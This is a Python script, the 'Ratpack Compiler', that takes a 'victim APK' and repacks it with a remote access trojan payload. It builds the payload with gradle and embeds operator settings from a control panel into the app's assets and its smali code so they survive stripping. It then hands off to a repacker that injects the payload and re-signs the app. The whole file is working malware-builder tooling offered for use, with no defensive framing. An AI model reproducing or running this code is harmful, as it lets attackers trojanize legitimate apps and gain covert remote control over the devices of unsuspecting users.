#!/usr/bin/env python3
"""
compile.py — the Ratpack Compiler.

Takes a victim APK and produces a repacked APK with the RAT payload inside.

The configuration comes from setting.json, the file the Ratpack Panel
generates and the operator downloads. Drop it in this folder (or point at it
with --setting) and the values are baked into the APK:

  - written to assets/setting.json, which the payload reads at runtime
  - patched into the payload's RatCfg smali, so it works even if the asset
    is stripped

Usage:
  ./compile.py victim.apk
  ./compile.py victim.apk -o repacked.apk
  ./compile.py victim.apk --setting /path/to/setting.json
  ./compile.py --build-payload      # build the payload APK first
"""

import argparse
import json
import os
import shutil
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
COMPILER_DIR = os.path.dirname(HERE)
PAYLOAD_DIR = os.path.join(COMPILER_DIR, "payload")
DEFAULT_SETTING = os.path.join(COMPILER_DIR, "setting.json")

# Repacker lives next to this file.
sys.path.insert(0, HERE)
import repack as repacker  # noqa: E402


def log(msg):
    print(f"  [*] {msg}", flush=True)


def err(msg):
    sys.stderr.write(f"  [!] {msg}\n")


def find_setting(explicit=None):
    """Locates setting.json: explicit path first, then the compiler folder."""
    if explicit:
        if not os.path.exists(explicit):
            raise SystemExit(f"setting.json not found: {explicit}")
        return explicit
    if os.path.exists(DEFAULT_SETTING):
        return DEFAULT_SETTING
    return None


def build_payload(verbose=True):
    """Builds the payload APK with gradle."""
    gradlew = os.path.join(PAYLOAD_DIR, "gradlew")
    if os.path.exists(gradlew):
        cmd = [gradlew, ":app:assembleDebug"]
    else:
        cmd = ["gradle", ":app:assembleDebug"]
    if verbose:
        log("building the payload APK")
    env = dict(os.environ)
    env.setdefault("GRADLE_USER_HOME", os.path.expanduser("~/.gradle"))
    r = subprocess.run(cmd, cwd=PAYLOAD_DIR, env=env)
    if r.returncode != 0:
        raise SystemExit("payload build failed")
    apk = os.path.join(PAYLOAD_DIR, "app", "build", "outputs", "apk", "debug", "app-debug.apk")
    if not os.path.exists(apk):
        raise SystemExit(f"payload APK not found after build: {apk}")
    log(f"payload: {apk}")
    return apk


def payload_apk(explicit=None, rebuild=False):
    """Returns the payload APK path, building it when needed."""
    if explicit:
        if not os.path.exists(explicit):
            raise SystemExit(f"payload APK not found: {explicit}")
        return explicit
    default = os.path.join(PAYLOAD_DIR, "app", "build", "outputs", "apk", "debug", "app-debug.apk")
    if rebuild or not os.path.exists(default):
        return build_payload()
    log(f"payload: {default}")
    return default


def main():
    ap = argparse.ArgumentParser(
        description="Ratpack Compiler — inject the RAT payload into an APK")
    ap.add_argument("apk", nargs="?", help="the victim APK to repack")
    ap.add_argument("-o", "--out", help="output APK (default: <apk>.repacked.apk)")
    ap.add_argument("--setting", "--setting-json",
                    help="setting.json from the panel (default: ./setting.json)")
    ap.add_argument("--payload", help="prebuilt payload APK")
    ap.add_argument("--rebuild-payload", action="store_true",
                    help="rebuild the payload APK before repacking")
    ap.add_argument("--keystore", help="keystore for signing")
    ap.add_argument("--ks-pass", default="android")
    ap.add_argument("--key-alias", default="androiddebugkey")
    ap.add_argument("--key-pass", default="android")
    ap.add_argument("--keep-temp", action="store_true")
    args = ap.parse_args()

    if not args.apk:
        ap.print_help()
        print()
        print("  Tip: download setting.json from the Ratpack Panel and put it here:")
        print(f"       {DEFAULT_SETTING}")
        return 2

    if not os.path.exists(args.apk):
        err(f"victim APK not found: {args.apk}")
        return 1

    setting_path = find_setting(args.setting)
    if setting_path:
        log(f"configuration: {setting_path}")
    else:
        err("no setting.json found — the payload will fall back to its defaults")
        err(f"put the panel's setting.json at: {DEFAULT_SETTING}")

    out = args.out or (os.path.splitext(args.apk)[0] + ".repacked.apk")

    rat = payload_apk(args.payload, args.rebuild_payload)

    # The repacker takes the setting document and does the whole pipeline.
    argv = [
        "--apk", args.apk,
        "--rat", rat,
        "--out", out,
        "--ks-pass", args.ks_pass,
        "--key-alias", args.key_alias,
        "--key-pass", args.key_pass,
    ]
    if args.keystore:
        argv += ["--keystore", args.keystore]
    if setting_path:
        argv += ["--setting", setting_path]
    if args.keep_temp:
        argv.append("--keep-temp")

    rc = repacker.main(argv)
    return rc


if __name__ == "__main__":
    sys.exit(main())
